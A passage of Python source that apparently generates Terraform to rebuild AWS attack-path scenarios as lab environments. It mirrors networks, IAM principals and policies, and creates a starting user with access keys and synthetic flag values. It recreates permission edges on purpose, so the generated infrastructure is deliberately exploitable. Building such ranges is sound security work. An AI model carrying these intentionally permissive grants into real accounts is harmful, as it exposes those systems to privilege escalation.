            model["vpc_endpoints"].update({value["VpcEndpointId"]: value for value in response.get("VpcEndpoints", [])})
    return model


def network_tf_address(prefix: str, resource_id: str) -> str:
    cleaned = re.sub(r"[^a-z0-9_]+", "_", resource_id.lower()).strip("_")
    return f"{prefix}_{cleaned}"


def render_network_from_context(
    evidence: dict[str, Any] | None,
) -> tuple[str, dict[str, str], dict[str, str], list[dict[str, Any]], list[str]]:
    model = network_model_from_context(evidence)
    blocks: list[str] = []
    subnet_refs: dict[str, str] = {}
    sg_refs: dict[str, str] = {}
    coverage: list[dict[str, Any]] = []
    blockers: list[str] = []
    vpc_refs: dict[str, str] = {}
    igw_refs: dict[str, str] = {}
    nat_refs: dict[str, str] = {}
    endpoint_refs: dict[str, str] = {}
    route_table_refs: dict[str, str] = {}
    acl_refs: dict[str, str] = {}

    for vpc_id, value in model["vpcs"].items():
        address = network_tf_address("vpc", vpc_id)
        attrs = model["vpc_attributes"].get(vpc_id, {})
        cidrs = value.get("CidrBlockAssociationSet", [])
        primary = value.get("CidrBlock") or next((item.get("CidrBlock") for item in cidrs if item.get("CidrBlock")), "10.99.0.0/16")
        blocks.append(f'''
resource "aws_vpc" "{address}" {{
  cidr_block           = {json.dumps(primary)}
  instance_tenancy     = {json.dumps(str(value.get('InstanceTenancy') or 'default'))}
  enable_dns_support   = {str(bool(attrs.get('EnableDnsSupport', True))).lower()}
  enable_dns_hostnames = {str(bool(attrs.get('EnableDnsHostnames', False))).lower()}
}}
''')
        vpc_refs[vpc_id] = f"aws_vpc.{address}.id"
        coverage.append({"type": "VPC", "source_id": vpc_id, "status": "FULL_REPRODUCIBLE"})

    for subnet_id, value in model["subnets"].items():
        vpc_ref = vpc_refs.get(value.get("VpcId"))
        if not vpc_ref:
            blockers.append(f"SUBNET_VPC_REQUIRED:{subnet_id}:{value.get('VpcId')}")
            continue
        address = network_tf_address("subnet", subnet_id)
        az_id = value.get("AvailabilityZoneId")
        az_line = f"  availability_zone_id = {json.dumps(az_id)}\n" if az_id else ""
        blocks.append(f'''
resource "aws_subnet" "{address}" {{
  vpc_id                  = {vpc_ref}
  cidr_block              = {json.dumps(str(value.get('CidrBlock')))}
{az_line}  map_public_ip_on_launch = {str(bool(value.get('MapPublicIpOnLaunch', False))).lower()}
}}
''')
        subnet_refs[subnet_id] = f"aws_subnet.{address}.id"
        coverage.append({"type": "SUBNET", "source_id": subnet_id, "status": "FULL_REPRODUCIBLE"})

    for group_id, value in model["security_groups"].items():
        if value.get("GroupName") == "default":
            # A new VPC receives its own default SG; explicit path SGs are safer to recreate.
            blockers.append(f"DEFAULT_SECURITY_GROUP_REVIEW:{group_id}")
            continue
        vpc_ref = vpc_refs.get(value.get("VpcId"))
        if not vpc_ref:
            blockers.append(f"SECURITY_GROUP_VPC_REQUIRED:{group_id}:{value.get('VpcId')}")
            continue
        address = network_tf_address("sg", group_id)
        blocks.append(f'''
resource "aws_security_group" "{address}" {{
  name        = "${{local.prefix}}-{address}"
  description = {json.dumps(str(value.get('Description') or 'mirrored security group'))}
  vpc_id      = {vpc_ref}
}}
''')
        sg_refs[group_id] = f"aws_security_group.{address}.id"
        coverage.append({"type": "SECURITY_GROUP", "source_id": group_id, "status": "FULL_REPRODUCIBLE"})

    for rule_id, value in model["security_group_rules"].items():
        group_ref = sg_refs.get(value.get("GroupId"))
        if not group_ref:
            continue
        referenced_group = value.get("ReferencedGroupInfo", {}).get("GroupId")
        source_lines: list[str] = []
        if value.get("CidrIpv4"):
            source_lines.append(f"  cidr_ipv4 = {json.dumps(value['CidrIpv4'])}")
        elif value.get("CidrIpv6"):
            source_lines.append(f"  cidr_ipv6 = {json.dumps(value['CidrIpv6'])}")
        elif value.get("PrefixListId"):
            source_lines.append(f"  prefix_list_id = {json.dumps(value['PrefixListId'])}")
        elif referenced_group and referenced_group in sg_refs:
            source_lines.append(f"  referenced_security_group_id = {sg_refs[referenced_group]}")
        else:
            blockers.append(f"SECURITY_GROUP_RULE_SOURCE_REQUIRED:{rule_id}")
            continue
        resource_type = "aws_vpc_security_group_egress_rule" if value.get("IsEgress") else "aws_vpc_security_group_ingress_rule"
        address = network_tf_address("rule", rule_id)
        port_lines = ""
        if value.get("IpProtocol") not in {"-1", -1}:
            if value.get("FromPort") is not None:
                port_lines += f"  from_port   = {int(value['FromPort'])}\n"
            if value.get("ToPort") is not None:
                port_lines += f"  to_port     = {int(value['ToPort'])}\n"
        blocks.append(f'''
resource "{resource_type}" "{address}" {{
  security_group_id = {group_ref}
  ip_protocol       = {json.dumps(str(value.get('IpProtocol') or '-1'))}
{port_lines}{chr(10).join(source_lines)}
}}
''')

    for igw_id, value in model["internet_gateways"].items():
        vpc_id = next((item.get("VpcId") for item in value.get("Attachments", []) if item.get("VpcId") in vpc_refs), None)
        if not vpc_id:
            continue
        address = network_tf_address("igw", igw_id)
        blocks.append(f'''
resource "aws_internet_gateway" "{address}" {{
  vpc_id = {vpc_refs[vpc_id]}
}}
''')
        igw_refs[igw_id] = f"aws_internet_gateway.{address}.id"

    for nat_id, value in model["nat_gateways"].items():
        if value.get("State") == "deleted":
            continue
        subnet_ref = subnet_refs.get(value.get("SubnetId"))
        if not subnet_ref:
            blockers.append(f"NAT_SUBNET_REQUIRED:{nat_id}:{value.get('SubnetId')}")
            continue
        address = network_tf_address("nat", nat_id)
        blocks.append(f'''
resource "aws_eip" "{address}" {{
  domain = "vpc"
}}

resource "aws_nat_gateway" "{address}" {{
  allocation_id = aws_eip.{address}.id
  subnet_id     = {subnet_ref}
}}
''')
        nat_refs[nat_id] = f"aws_nat_gateway.{address}.id"
        coverage.append({"type": "NAT_GATEWAY", "source_id": nat_id, "status": "SEMANTIC_MIRROR_NEW_EIP"})

    for route_table_id in model["route_tables"]:
        address = network_tf_address("rt", route_table_id)
        route_table_refs[route_table_id] = f"aws_route_table.{address}.id"

    for endpoint_id, value in model["vpc_endpoints"].items():
        vpc_ref = vpc_refs.get(value.get("VpcId"))
        if not vpc_ref:
            blockers.append(f"ENDPOINT_VPC_REQUIRED:{endpoint_id}:{value.get('VpcId')}")
            continue
        address = network_tf_address("vpce", endpoint_id)
        endpoint_type = str(value.get("VpcEndpointType") or "Gateway")
        subnet_values = [subnet_refs[item] for item in value.get("SubnetIds", []) if item in subnet_refs]
        group_values = [sg_refs[item.get("GroupId")] for item in value.get("Groups", []) if item.get("GroupId") in sg_refs]
        route_values = [route_table_refs[item] for item in value.get("RouteTableIds", []) if item in route_table_refs]
        type_specific = (
            f"  private_dns_enabled = {str(bool(value.get('PrivateDnsEnabled', False))).lower()}\n"
            f"  subnet_ids          = [{', '.join(subnet_values)}]\n"
            f"  security_group_ids  = [{', '.join(group_values)}]"
            if endpoint_type == "Interface"
            else f"  route_table_ids = [{', '.join(route_values)}]"
        )
        policy_line = (
            f"\n  policy = {json.dumps(str(value.get('PolicyDocument')))}"
            if value.get("PolicyDocument")
            else ""
        )
        blocks.append(f'''
resource "aws_vpc_endpoint" "{address}" {{
  vpc_id            = {vpc_ref}
  service_name      = {json.dumps(str(value.get('ServiceName')))}
  vpc_endpoint_type = {json.dumps(endpoint_type)}
{type_specific}{policy_line}
}}
''')
        endpoint_refs[endpoint_id] = f"aws_vpc_endpoint.{address}.id"

    # Route tables are emitted after gateways so targets can be remapped.
    explicit_subnet_routes: set[str] = set()
    main_route_tables: dict[str, dict[str, Any]] = {}
    for route_table_id, value in model["route_tables"].items():
        if any(item.get("Main") for item in value.get("Associations", [])):
            main_route_tables[value.get("VpcId")] = value
        address = network_tf_address("rt", route_table_id)
        vpc_ref = vpc_refs.get(value.get("VpcId"))
        if not vpc_ref:
            blockers.append(f"ROUTE_TABLE_VPC_REQUIRED:{route_table_id}:{value.get('VpcId')}")
            continue
        blocks.append(f'''
resource "aws_route_table" "{address}" {{
  vpc_id = {vpc_ref}
}}
''')
        for association in value.get("Associations", []):
            subnet_id = association.get("SubnetId")
            if subnet_id in subnet_refs:
                explicit_subnet_routes.add(subnet_id)
                assoc_address = network_tf_address("rta", association.get("RouteTableAssociationId") or f"{route_table_id}-{subnet_id}")
                blocks.append(f'''
resource "aws_route_table_association" "{assoc_address}" {{
  subnet_id      = {subnet_refs[subnet_id]}
  route_table_id = aws_route_table.{address}.id
}}
''')
        for index, route in enumerate(value.get("Routes", [])):
            if route.get("GatewayId") == "local" or route.get("State") == "blackhole":
                continue
            destination_lines = []
            if route.get("DestinationCidrBlock"):
                destination_lines.append(f"  destination_cidr_block = {json.dumps(route['DestinationCidrBlock'])}")
            elif route.get("DestinationIpv6CidrBlock"):
                destination_lines.append(f"  destination_ipv6_cidr_block = {json.dumps(route['DestinationIpv6CidrBlock'])}")
            elif route.get("DestinationPrefixListId"):
                destination_lines.append(f"  destination_prefix_list_id = {json.dumps(route['DestinationPrefixListId'])}")
            target_line = None
            if route.get("GatewayId") in igw_refs:
                target_line = f"  gateway_id = {igw_refs[route['GatewayId']]}"
            elif route.get("NatGatewayId") in nat_refs:
                target_line = f"  nat_gateway_id = {nat_refs[route['NatGatewayId']]}"
            elif route.get("VpcEndpointId") in endpoint_refs:
                target_line = f"  vpc_endpoint_id = {endpoint_refs[route['VpcEndpointId']]}"
            if not destination_lines or not target_line:
                blockers.append(f"ROUTE_TARGET_REQUIRED:{route_table_id}:{index}")
                continue
            route_address = network_tf_address("route", f"{route_table_id}-{index}")
            blocks.append(f'''
resource "aws_route" "{route_address}" {{
  route_table_id = aws_route_table.{address}.id
{chr(10).join(destination_lines)}
{target_line}
}}
''')

    # Associate subnets that relied on the source main table with its recreated table.
    for subnet_id, subnet in model["subnets"].items():
        if subnet_id in explicit_subnet_routes or subnet_id not in subnet_refs:
            continue
        main = main_route_tables.get(subnet.get("VpcId"))
        if not main or main.get("RouteTableId") not in route_table_refs:
            continue
        address = network_tf_address("rta_main", subnet_id)
        blocks.append(f'''
resource "aws_route_table_association" "{address}" {{
  subnet_id      = {subnet_refs[subnet_id]}
  route_table_id = {route_table_refs[main['RouteTableId']]}
}}
''')

    for acl_id, value in model["network_acls"].items():
        vpc_ref = vpc_refs.get(value.get("VpcId"))
        if not vpc_ref:
            continue
        address = network_tf_address("acl", acl_id)
        blocks.append(f'''
resource "aws_network_acl" "{address}" {{
  vpc_id = {vpc_ref}
}}
''')
        acl_refs[acl_id] = f"aws_network_acl.{address}.id"
        for entry in value.get("Entries", []):
            if entry.get("RuleNumber") == 32767:
                continue
            rule_address = network_tf_address("acl_rule", f"{acl_id}-{entry.get('Egress')}-{entry.get('RuleNumber')}")
            port_range = entry.get("PortRange") or {}
            cidr_line = (
                f"  ipv6_cidr_block = {json.dumps(str(entry.get('Ipv6CidrBlock')))}"
                if entry.get("Ipv6CidrBlock")
                else f"  cidr_block      = {json.dumps(str(entry.get('CidrBlock') or '0.0.0.0/0'))}"
            )
            blocks.append(f'''
resource "aws_network_acl_rule" "{rule_address}" {{
  network_acl_id = aws_network_acl.{address}.id
  rule_number    = {int(entry.get('RuleNumber'))}
  egress         = {str(bool(entry.get('Egress'))).lower()}
  protocol       = {json.dumps(str(entry.get('Protocol')))}
  rule_action    = {json.dumps(str(entry.get('RuleAction')).lower())}
{cidr_line}
  from_port      = {int(port_range.get('From') or 0)}
  to_port        = {int(port_range.get('To') or 0)}
}}
''')
        for association in value.get("Associations", []):
            subnet_id = association.get("SubnetId")
            if subnet_id in subnet_refs:
                assoc_address = network_tf_address("acl_assoc", f"{acl_id}-{subnet_id}")
                blocks.append(f'''
resource "aws_network_acl_association" "{assoc_address}" {{
  network_acl_id = aws_network_acl.{address}.id
  subnet_id      = {subnet_refs[subnet_id]}
}}
''')
    return "\n".join(blocks), subnet_refs, sg_refs, coverage, sorted(set(blockers))


def generic_terraform(
    scenario: Scenario,
    nodes: dict[str, Node],
    edges: list[Edge],
    context_evidence: dict[str, Any] | None = None,
) -> dict[str, str]:
    selected_nodes = {node_id: nodes[node_id] for node_id in scenario.node_ids}
    selected_edges = [
        edge
        for edge in edges
        if edge.start in selected_nodes and edge.end in selected_nodes
    ]
    catalog = official_edge_catalog()
    addresses = {node_id: tf_address(node) for node_id, node in selected_nodes.items()}
    terraform_refs: dict[str, str] = {}
    resource_refs: dict[str, str] = {}
    blocks: list[str] = [TF_HEADER]
    outputs: list[str] = []
    fixtures: dict[str, str] = {}
    coverage_nodes: list[dict[str, Any]] = []
    coverage_edges: list[dict[str, Any]] = []
    blockers: list[str] = []
    required_inputs_list: list[dict[str, Any]] = []
    network_hcl, network_subnet_refs, network_sg_refs, network_coverage, network_blockers = render_network_from_context(context_evidence)
    if network_hcl:
        blocks.append(network_hcl)
    blockers.extend(network_blockers)

    def add_coverage(node: Node, status: str, reason: str) -> None:
        coverage_nodes.append(
            {"node_id": node.id, "kind": node.primary_kind, "status": status, "reason": reason}
        )

    # First pass: principals and standalone resources.
    for node_id, node in selected_nodes.items():
        address = addresses[node_id]
        slug = re.sub(r"[^a-z0-9-]+", "-", node_name(node).lower()).strip("-")[:28] or "resource"
        kind = node.primary_kind
        if kind in {"AWS_Organization", "AWS_Account"}:
            add_coverage(node, "CONTEXT_ONLY", "Organization/account containers are not cloned into a target account.")
            terraform_refs[node_id] = "data.aws_caller_identity.current.account_id"
            resource_refs[node_id] = '"*"'
        elif kind == "AWS_User":
            blocks.append(f'''
resource "aws_iam_user" "{address}" {{
  name          = substr("${{local.prefix}}-{slug}", 0, 64)
  force_destroy = true
}}
''')
            terraform_refs[node_id] = f"aws_iam_user.{address}.arn"
            resource_refs[node_id] = f"aws_iam_user.{address}.arn"
            add_coverage(node, "FULL_REPRODUCIBLE", "IAM user structure is reproducible with a new target-account identity.")
        elif kind == "AWS_Group":
            blocks.append(f'''
resource "aws_iam_group" "{address}" {{
  name = substr("${{local.prefix}}-{slug}", 0, 64)
}}
''')
            terraform_refs[node_id] = f"aws_iam_group.{address}.arn"
            resource_refs[node_id] = f"aws_iam_group.{address}.arn"
            add_coverage(node, "FULL_REPRODUCIBLE", "IAM group structure is reproducible.")
        elif kind == "AWS_Role":
            # Role bodies are emitted in the second pass after ARN references exist.
            terraform_refs[node_id] = f"aws_iam_role.{address}.arn"
            resource_refs[node_id] = f"aws_iam_role.{address}.arn"
        elif kind == "AWS_Policy":
            if (node.arn or "").startswith("arn:aws:iam::aws:policy/"):
                terraform_refs[node_id] = json.dumps(node.arn)
                resource_refs[node_id] = json.dumps(node.arn)
                add_coverage(node, "REFERENCE_ONLY", "AWS-managed policy is referenced, not recreated.")
            else:
                terraform_refs[node_id] = f"aws_iam_policy.{address}.arn"
                resource_refs[node_id] = f"aws_iam_policy.{address}.arn"
        elif kind == "AWS_S3Bucket":
            blocks.append(f'''
resource "aws_s3_bucket" "{address}" {{
  bucket        = lower(substr("${{local.prefix}}-{slug}-${{data.aws_caller_identity.current.account_id}}", 0, 63))
  force_destroy = true
}}

resource "aws_s3_bucket_public_access_block" "{address}" {{
  bucket                  = aws_s3_bucket.{address}.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}}
''')
            terraform_refs[node_id] = f"aws_s3_bucket.{address}.arn"
            resource_refs[node_id] = f"aws_s3_bucket.{address}.arn"
            add_coverage(node, "SEMANTIC_MIRROR", "Bucket identity is remapped and safe public-access controls are enforced.")
        elif kind == "AWS_S3Object":
            # Emitted after parent bucket lookup.
            add_coverage(node, "SEMANTIC_MIRROR", "Object content is replaced with a synthetic canary.")
        elif kind == "AWS_SSMParameter":
            blocks.append(f'''
resource "aws_ssm_parameter" "{address}" {{
  name  = "/mirror/${{var.resource_name_prefix}}/{scenario.scenario_id}/{slug}"
  type  = "String"
  value = var.synthetic_flag
}}
''')
            terraform_refs[node_id] = f"aws_ssm_parameter.{address}.arn"
            resource_refs[node_id] = f"aws_ssm_parameter.{address}.arn"
            add_coverage(node, "SEMANTIC_MIRROR", "Parameter structure is reproduced with a synthetic value.")
        elif kind == "AWS_KMSKey":
            key_spec = str(node.properties.get("key_spec") or "SYMMETRIC_DEFAULT")
            key_usage = str(node.properties.get("key_usage") or "ENCRYPT_DECRYPT")
            rotation = str(bool(node.properties.get("key_rotation_enabled", False))).lower()
            blocks.append(f'''
resource "aws_kms_key" "{address}" {{
  description              = "Synthetic mirror for {slug}"
  customer_master_key_spec = {json.dumps(key_spec)}
  key_usage                = {json.dumps(key_usage)}
  enable_key_rotation      = {rotation}
  deletion_window_in_days  = 7
}}
''')
            terraform_refs[node_id] = f"aws_kms_key.{address}.arn"
            resource_refs[node_id] = f"aws_kms_key.{address}.arn"
            add_coverage(node, "SEMANTIC_MIRROR", "A new key is created; original KMS key material is never reproducible.")
        elif kind == "AWS_LambdaFunction":
            terraform_refs[node_id] = f"aws_lambda_function.{address}.arn"
            resource_refs[node_id] = f"aws_lambda_function.{address}.arn"
        elif kind == "AWS_EC2Instance":
            terraform_refs[node_id] = f"aws_instance.{address}.arn"
            resource_refs[node_id] = f"aws_instance.{address}.arn"
            required_inputs_list.append(
                {
                    "name": f"ec2_ami_overrides.{address}",
                    "reason": "AMI portability or an approved AMI/snapshot copy must be confirmed.",
                }
            )
        elif kind in {
            "AWS_CloudFormationStack",
            "AWS_CloudFormationStackSet",
            "AWS_EKSCluster",
            "AWS_EKSNodeGroup",
            "AWS_SAMLProvider",
            "AWS_OIDCProvider",
            "AWS_ServiceControlPolicy",
            "AWS_ResourceControlPolicy",
        }:
            blockers.append(f"{kind}:{node_name(node)}")
            add_coverage(node, "CONTEXT_REQUIRED", "Requires an approved service-specific artifact or external dependency adapter.")
        else:
            blockers.append(f"UNKNOWN_NODE:{kind}:{node_name(node)}")
            add_coverage(node, "NON_REPRODUCIBLE", "No registered Terraform renderer exists.")

    # Second pass: roles and customer-managed policies with ARN remapping.
    policy_references = {
        node_id: (
            "${" + expression + "}"
            if not expression.startswith('"')
            else (selected_nodes[node_id].arn or expression.strip('"'))
        )
        for node_id, expression in terraform_refs.items()
    }
    for node_id, node in selected_nodes.items():
        address = addresses[node_id]
        kind = node.primary_kind
        slug = re.sub(r"[^a-z0-9-]+", "-", node_name(node).lower()).strip("-")[:28] or "resource"
        if kind == "AWS_Role":
            trust = node.properties.get("assume_role_policy_document")
            if not trust:
                incoming_services = []
                for edge in selected_edges:
                    if edge.kind == "AWS_RunsAs" and edge.end == node_id:
                        source_kind = selected_nodes[edge.start].primary_kind
                        incoming_services.extend(
                            {
                                "AWS_LambdaFunction": ["lambda.amazonaws.com"],
                                "AWS_EC2Instance": ["ec2.amazonaws.com"],
                                "AWS_CloudFormationStack": ["cloudformation.amazonaws.com"],
                                "AWS_EKSNodeGroup": ["ec2.amazonaws.com"],
                            }.get(source_kind, [])
                        )
                if incoming_services:
                    trust = {
                        "Version": "2012-10-17",
                        "Statement": [{"Effect": "Allow", "Principal": {"Service": sorted(set(incoming_services))}, "Action": "sts:AssumeRole"}],
                    }
                else:
                    blockers.append(f"ROLE_TRUST_REQUIRED:{node_name(node)}")
                    trust = {"Version": "2012-10-17", "Statement": []}
            trust_text = remap_policy_document(
                trust, selected_nodes, policy_references, scenario.source_account_id
            )
            blocks.append(f'''
resource "aws_iam_role" "{address}" {{
  name = substr("${{local.prefix}}-{slug}", 0, 64)
  assume_role_policy = <<POLICY
{trust_text}
POLICY
}}
''')
            add_coverage(node, "FULL_REPRODUCIBLE", "Trust policy is remapped to target-account principals when present.")
        elif kind == "AWS_Policy" and not (node.arn or "").startswith("arn:aws:iam::aws:policy/"):
            policy_text = remap_policy_document(
                node.properties.get("policy_document"),
                selected_nodes,
                policy_references,
                scenario.source_account_id,
            )
            blocks.append(f'''
resource "aws_iam_policy" "{address}" {{
  name = substr("${{local.prefix}}-{slug}", 0, 128)
  policy = <<POLICY
{policy_text}
POLICY
}}
''')
            add_coverage(node, "FULL_REPRODUCIBLE", "Customer-managed policy document is remapped.")

    # Structural relationships: attachments, membership, and workload roles.
    for edge in selected_edges:
        start = selected_nodes[edge.start]
        end = selected_nodes[edge.end]
        eid = hashlib.sha1(edge_identifier(edge).encode("utf-8")).hexdigest()[:10]
        if edge.kind == "AWS_HasPolicy" and end.primary_kind == "AWS_Policy":
            policy_arn = terraform_refs.get(edge.end)
            if not policy_arn:
                continue
            if start.primary_kind == "AWS_Role":
                blocks.append(f'''
resource "aws_iam_role_policy_attachment" "rel_{eid}" {{
  role       = aws_iam_role.{addresses[edge.start]}.name
  policy_arn = {policy_arn}
}}
''')
            elif start.primary_kind == "AWS_User":
                blocks.append(f'''
resource "aws_iam_user_policy_attachment" "rel_{eid}" {{
  user       = aws_iam_user.{addresses[edge.start]}.name
  policy_arn = {policy_arn}
}}
''')
            elif start.primary_kind == "AWS_Group":
                blocks.append(f'''
resource "aws_iam_group_policy_attachment" "rel_{eid}" {{
  group      = aws_iam_group.{addresses[edge.start]}.name
  policy_arn = {policy_arn}
}}
''')
            coverage_edges.append({"edge": edge_identifier(edge), "status": "FULL_REPRODUCIBLE", "actions": []})
        elif edge.kind in {"AWS_MemberOf", "AWS_HasMember"}:
            user_id = edge.start if start.primary_kind == "AWS_User" else edge.end
            group_id = edge.end if end.primary_kind == "AWS_Group" else edge.start
            if selected_nodes[user_id].primary_kind == "AWS_User" and selected_nodes[group_id].primary_kind == "AWS_Group":
                blocks.append(f'''
resource "aws_iam_user_group_membership" "rel_{eid}" {{
  user   = aws_iam_user.{addresses[user_id]}.name
  groups = [aws_iam_group.{addresses[group_id]}.name]
}}
''')
                coverage_edges.append({"edge": edge_identifier(edge), "status": "FULL_REPRODUCIBLE", "actions": []})

    # Data objects need their parent bucket.
    for node_id, node in selected_nodes.items():
        if node.primary_kind != "AWS_S3Object":
            continue
        parent = next(
            (
                edge.start
                for edge in selected_edges
                if edge.kind == "AWS_Contains"
                and edge.end == node_id
                and selected_nodes[edge.start].primary_kind == "AWS_S3Bucket"
            ),
            None,
        )
        if not parent:
            blockers.append(f"S3_PARENT_REQUIRED:{node_name(node)}")
            continue
        address = addresses[node_id]
        key = str(node.properties.get("key") or (node.arn or "").split(f"arn:aws:s3:::{(selected_nodes[parent].arn or '').removeprefix('arn:aws:s3:::')}/", 1)[-1] or "canary.txt")
        blocks.append(f'''
resource "aws_s3_object" "{address}" {{
  bucket  = aws_s3_bucket.{addresses[parent]}.id
  key     = {json.dumps(key)}
  content = var.synthetic_flag
}}
''')
        terraform_refs[node_id] = f'"${{aws_s3_bucket.{addresses[parent]}.arn}}/{key}"'
        resource_refs[node_id] = f'"${{aws_s3_bucket.{addresses[parent]}.arn}}/{key}"'

    # Lambda functions: exact configuration, synthetic code unless an approved
    # artifact is supplied later.
    for node_id, node in selected_nodes.items():
        if node.primary_kind != "AWS_LambdaFunction":
            continue
        address = addresses[node_id]
        runtime = str(node.properties.get("runtime") or "python3.11")
        handler = str(node.properties.get("handler") or "lambda_function.lambda_handler")
        role_id = next((edge.end for edge in selected_edges if edge.kind == "AWS_RunsAs" and edge.start == node_id and selected_nodes[edge.end].primary_kind == "AWS_Role"), None)
        if not role_id:
            blockers.append(f"LAMBDA_ROLE_REQUIRED:{node_name(node)}")
            add_coverage(node, "CONTEXT_REQUIRED", "Lambda execution role edge is missing.")
            continue
        if not runtime.startswith("python") or "." not in handler:
            blockers.append(f"LAMBDA_ARTIFACT_REQUIRED:{node_name(node)}")
            add_coverage(node, "ARTIFACT_REQUIRED", "Non-Python Lambda requires an approved deployment artifact.")
            continue
        module_name, function_name = handler.rsplit(".", 1)
        fixture_path = f"fixtures/{address}/{module_name.replace('.', '/')}.py"
        fixtures[fixture_path] = f'''def {function_name}(event, context):\n    return {{"statusCode": 200, "body": "synthetic-mirror"}}\n'''
        blocks.append(f'''
data "archive_file" "{address}" {{
  type        = "zip"
  source_dir  = "${{path.module}}/fixtures/{address}"
  output_path = "${{path.module}}/{address}.zip"
}}

resource "aws_lambda_function" "{address}" {{
  function_name    = substr("${{local.prefix}}-{address}", 0, 64)
  role             = aws_iam_role.{addresses[role_id]}.arn
  runtime          = {json.dumps(runtime)}
  handler          = {json.dumps(handler)}
  memory_size      = {int(node.properties.get('memory_size') or 128)}
  timeout          = {int(node.properties.get('timeout') or 3)}
  filename         = lookup(var.lambda_package_files, {json.dumps(address)}, "") != "" ? lookup(var.lambda_package_files, {json.dumps(address)}, "") : data.archive_file.{address}.output_path
  source_code_hash = lookup(var.lambda_package_files, {json.dumps(address)}, "") != "" ? filebase64sha256(lookup(var.lambda_package_files, {json.dumps(address)}, "")) : data.archive_file.{address}.output_base64sha256
}}
''')
        add_coverage(node, "SEMANTIC_MIRROR", "Runtime configuration is preserved and code is replaced with a synthetic fixture.")

    # Generic EC2 semantic mirror. Exact disk state is handled by the artifact plan.
    ec2_nodes = [node for node in selected_nodes.values() if node.primary_kind == "AWS_EC2Instance"]
    needs_synthetic_network = bool(
        ec2_nodes
        and any(str(node.properties.get("subnet_id") or "") not in network_subnet_refs for node in ec2_nodes)
    )
    if needs_synthetic_network:
        blocks.append(r'''
resource "aws_vpc" "generic" {
  cidr_block           = "10.88.0.0/16"
  enable_dns_support   = true
  enable_dns_hostnames = true
}

resource "aws_subnet" "generic" {
  vpc_id     = aws_vpc.generic.id
  cidr_block = "10.88.1.0/24"
}

resource "aws_security_group" "generic" {
  name        = "${local.prefix}-generic"
  description = "No ingress; generic semantic mirror"
  vpc_id      = aws_vpc.generic.id
}
''')
        blockers.append("SOURCE_NETWORK_CONTEXT_REQUIRED")
    if ec2_nodes:
        for node in ec2_nodes:
            address = addresses[node.id]
            original_ami = str(node.properties.get("image_id") or "")
            subnet_id = str(node.properties.get("subnet_id") or "")
            subnet_expression = network_subnet_refs.get(subnet_id, "aws_subnet.generic.id")
            source_groups = parse_json_property(node.properties.get("security_groups"), [])
            source_group_ids = [
                str(item.get("GroupId"))
                for item in source_groups
                if isinstance(item, dict) and item.get("GroupId")
            ]
            mapped_groups = [network_sg_refs[item] for item in source_group_ids if item in network_sg_refs]
            group_line = (
                "  vpc_security_group_ids = [" + ", ".join(mapped_groups) + "]\n"
                if mapped_groups
                else (
                    "  vpc_security_group_ids = [aws_security_group.generic.id]\n"
                    if needs_synthetic_network
                    else ""
                )
            )
            blocks.append(f'''
resource "aws_instance" "{address}" {{
  ami                    = lookup(var.ec2_ami_overrides, {json.dumps(address)}, {json.dumps(original_ami)})
  instance_type          = {json.dumps(str(node.properties.get('instance_type') or 't3.micro'))}
  subnet_id              = {subnet_expression}
{group_line}

  lifecycle {{
    precondition {{
      condition     = lookup(var.ec2_ami_overrides, {json.dumps(address)}, {json.dumps(original_ami)}) != ""
      error_message = "Provide an approved AMI ID for {address}."
    }}
  }}
}}
''')
            add_coverage(node, "SEMANTIC_MIRROR", "Instance shape is preserved; network and disk state require context/artifact decisions.")

    # Permission edges become minimal inline policies on their source principal.
    for edge in selected_edges:
        if edge.kind in STRUCTURAL_EDGE_KINDS:
            continue
        source = selected_nodes[edge.start]
        info = catalog.get(edge.kind, {})
        actions = list(info.get("actions", []))
        status = "FULL_REPRODUCIBLE" if actions else "CONTEXT_REQUIRED"
        coverage_edges.append({"edge": edge_identifier(edge), "status": status, "actions": actions})
        if not actions:
            blockers.append(f"EDGE_ACTION_REQUIRED:{edge.kind}")
            continue
        if source.primary_kind not in {"AWS_User", "AWS_Role", "AWS_Group"}:
            blockers.append(f"EDGE_SOURCE_ADAPTER_REQUIRED:{edge.kind}:{source.primary_kind}")
            continue
        target_expression = resource_refs.get(edge.end, '"*"')
        eid = hashlib.sha1(edge_identifier(edge).encode("utf-8")).hexdigest()[:10]
        policy_body = f'''jsonencode({{
    Version = "2012-10-17"
    Statement = [{{
      Effect   = "Allow"
      Action   = {json.dumps(actions)}
      Resource = {target_expression}
    }}]
  }})'''
        if source.primary_kind == "AWS_User":
            blocks.append(f'''
resource "aws_iam_user_policy" "edge_{eid}" {{
  name   = "${{local.prefix}}-edge-{eid}"
  user   = aws_iam_user.{addresses[edge.start]}.name
  policy = {policy_body}
}}
''')
        elif source.primary_kind == "AWS_Role":
            blocks.append(f'''
resource "aws_iam_role_policy" "edge_{eid}" {{
  name   = "${{local.prefix}}-edge-{eid}"
  role   = aws_iam_role.{addresses[edge.start]}.id
  policy = {policy_body}
}}
''')
        else:
            blocks.append(f'''
resource "aws_iam_group_policy" "edge_{eid}" {{
  name   = "${{local.prefix}}-edge-{eid}"
  group  = aws_iam_group.{addresses[edge.start]}.name
  policy = {policy_body}
}}
''')

    start_node = selected_nodes.get(scenario.start_node_id)
    if start_node and start_node.primary_kind == "AWS_User":
        address = addresses[start_node.id]
        blocks.append(f'''
resource "aws_iam_access_key" "starting" {{
  user = aws_iam_user.{address}.name
}}
''')
        outputs.extend(
            [
                f'''output "starting_user_name" {{
  value = aws_iam_user.{address}.name
}}''',
                '''output "starting_access_key_id" {
  value     = aws_iam_access_key.starting.id
  sensitive = true
}''',
                '''output "starting_secret_access_key" {
  value     = aws_iam_access_key.starting.secret
  sensitive = true
}''',
            ]
        )

    blockers = sorted(set(blockers))
    coverage = {
        "mode": "GENERIC_REGISTRY",
        "scenario_id": scenario.scenario_id,
        "overall": "CONTEXT_REQUIRED" if blockers else "SEMANTIC_MIRROR_READY",
        "nodes": coverage_nodes,
        "network": network_coverage,
        "edges": coverage_edges,
        "blockers": blockers,
        "required_inputs": required_inputs_list,
        "warning": "Semantic equivalence is targeted; source IDs, secrets, key material, and business data are not cloned.",
    }
    variable_extra = r'''

variable "ec2_ami_overrides" {
  description = "Approved destination-account AMI IDs keyed by generated EC2 address"
  type        = map(string)
  default     = {}
}

variable "lambda_package_files" {
  description = "Approved Lambda ZIP artifacts keyed by generated Lambda address"
  type        = map(string)
  default     = {}
}

variable "allow_partial_reconstruction" {
  description = "Explicitly acknowledge unresolved generic coverage blockers"
  type        = bool
  default     = false
}
'''
    if blockers:
